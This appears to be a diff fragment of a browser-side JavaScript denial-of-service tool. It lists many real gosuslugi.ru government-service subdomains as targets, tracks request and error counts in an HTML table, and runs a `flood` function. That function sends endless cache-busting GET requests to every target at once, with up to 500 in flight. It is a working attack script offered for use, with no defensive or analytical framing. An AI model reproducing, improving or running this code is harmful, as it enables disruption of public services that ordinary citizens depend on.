+'https://t178.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://t26.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://test-deg.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://torgi-demo1.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://tp.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://uat-static.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://uviri.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://voxel.gslb.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://vtc.dom.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://widget.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://widget-svcdev.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://www.dom.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://www.gslb.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://www-reg1-demo1.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://www-reg2-demo1.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 }
+       }    
+  
+
+  var statsEl = document.getElementById('stats');
+  function printStats() {
+    statsEl.innerHTML = '<table border="1"><thead><tr><th>Web</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' + Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses  }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>'
+  }
+  setInterval(printStats, 1000);
+
+  var CONCURRENCY_LIMIT = 500
+  var queue = []
+
+  async function fetchWithTimeout(resource, options) {
+    const controller = new AbortController();
+    const id = setTimeout(() => controller.abort(), options.timeout);
+    return fetch(resource, {
+      method: 'GET',
+      mode: 'no-cors',
+      signal: controller.signal
+    }).then((response) => {
+  
+      clearTimeout(id);
+      
+      return response;
+    }).catch((error) => {
+        console.log(error.code);
+      clearTimeout(id);
+      throw error;
+    });
+  }
+
+  async function flood(target) {
+    for (var i = 0;; ++i) {
+      if (queue.length > CONCURRENCY_LIMIT) {
+        await queue.shift()
+      }
+      rand = i % 3 === 0 ? '' : ('?' + Math.random() * 2000)
+      queue.push(
+        fetchWithTimeout(target+rand, { timeout: 1000 })
+          .catch((error) => {
+            if (error.code === 20 /* ABORT */) {
+              return;
+            }
+            targets[target].number_of_errored_responses++;
+          })
+          .then((response) => {
+            if (response && !response.ok) {
+              targets[target].number_of_errored_responses++;
+            }
+            targets[target].number_of_requests++;
+          })
+
+      )
+    }
+  }
+  
+  // Start
+  Object.keys(targets).map(flood)
+</script>
